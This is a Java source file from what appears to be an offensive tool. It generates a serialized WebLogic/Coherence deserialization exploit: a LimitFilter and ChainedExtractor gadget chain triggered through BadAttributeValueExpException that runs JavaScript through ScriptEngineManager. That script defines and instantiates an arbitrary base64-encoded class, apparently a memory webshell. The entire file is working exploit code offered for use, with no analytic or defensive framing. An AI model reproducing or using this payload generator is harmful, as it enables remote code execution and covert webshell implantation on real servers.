package com.feihong.payload;

import com.feihong.template.WeblogicMemshellTemplate;
import com.feihong.utils.ClassFiles;
import com.feihong.utils.Gadgets;
import com.feihong.utils.Reflections;
import com.feihong.utils.Util;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import org.apache.shiro.codec.Base64;

import javax.management.BadAttributeValueExpException;
import javax.script.ScriptEngineManager;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class ScriptEnginePayload {
    public static byte[] generate(Class cls) throws Exception {
        byte[] bytes = ClassFiles.classAsBytes(cls);
        String classCode = Base64.encodeToString(bytes);

        String code = "var bytes = org.apache.shiro.codec.Base64.decode('" + classCode + "');\n" +
                "        var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "        try{\n" +
                "            var clazz = classLoader.loadClass('" + cls.getName() + "');\n" +
                "            clazz.newInstance();\n" +
                "        }catch(err){\n" +
                "            var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "            method.setAccessible(true);\n" +
                "            var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "            clazz.newInstance();\n" +
                "        }";

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getConstructor",
                new Object[]{new Class[0]}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "newInstance",
                new Object[]{new Object[0]}
        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "getEngineByName",
                new Object[]{"javascript"}
        );

        ReflectionExtractor extractor4 = new ReflectionExtractor(
                "eval",
                new Object[]{code}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
                extractor4
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
        LimitFilter limitFilter = new LimitFilter();

        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);

        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, ScriptEngineManager.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        return Util.serialize(badAttributeValueExpException);
    }
}
